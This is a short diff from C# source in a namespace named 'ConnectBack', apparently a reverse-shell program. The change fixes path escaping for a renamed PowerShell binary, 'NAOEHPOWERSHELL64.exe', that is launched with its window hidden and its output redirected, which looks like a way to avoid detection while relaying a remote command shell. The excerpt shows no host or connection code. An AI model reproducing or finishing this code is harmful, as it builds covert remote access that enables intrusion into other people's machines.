@@ -28,7 +28,7 @@ namespace ConnectBack
 						StringBuilder strInput = new StringBuilder();
 
 						Process p = new Process();
-						p.StartInfo.FileName = "C:\users\ibenevides\desktop\NAOEHPOWERSHELL64.exe";
+						p.StartInfo.FileName = "C:\\users\\ibenevides\\desktop\\NAOEHPOWERSHELL64.exe";
 						p.StartInfo.CreateNoWindow = true;
 						p.StartInfo.UseShellExecute = false;
 						p.StartInfo.RedirectStandardOutput = true;
